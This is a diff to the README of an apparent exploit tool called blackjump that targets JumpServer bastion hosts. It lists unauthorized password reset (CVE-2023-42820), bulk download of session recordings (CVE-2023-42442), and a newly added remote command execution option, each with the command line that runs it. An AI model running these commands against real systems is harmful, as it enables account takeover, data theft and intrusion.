@@ -16,6 +16,7 @@
 JumpServer Fortress Machine Integrated Vulnerability Exploit Tool
 - [x] Unauthorized password reset for any user (CVE-2023-42820)
 - [x] Unauthorized download of all operation videos (CVE-2023-42442)
+- [x] Unauthorized Remote Command Execution (RCE 2021)
 
 ## Install
 ```bash
@@ -33,6 +34,13 @@ python3 blackjump.py reset https://vulerability
 python3 blackjump.py dump https://vulerability
 ```
 ![img_1.png](img/img_1.png)
+
++ RCE
+```shell
+python3 blackjump.py rce http(s)://vulerability
+```
+![img.png](img/img_2.png)
+
 + help
 ```bash
 python3 blackjump.py {reset,dump} -h
